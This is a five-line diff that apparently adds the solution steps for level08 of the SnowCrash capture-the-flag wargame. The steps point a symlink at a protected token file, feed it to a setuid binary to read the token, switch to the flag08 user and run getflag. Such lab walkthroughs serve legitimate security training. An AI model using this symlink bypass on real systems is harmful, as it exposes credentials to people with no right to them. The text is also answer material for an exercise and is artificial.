@@ -1,0 +1,5 @@
+[snowcrash]
+ln -s /home/user/level08/token /tmp/symlink
+/home/user/level08/./level08 /tmp/symlink
+su flag08
+getflag
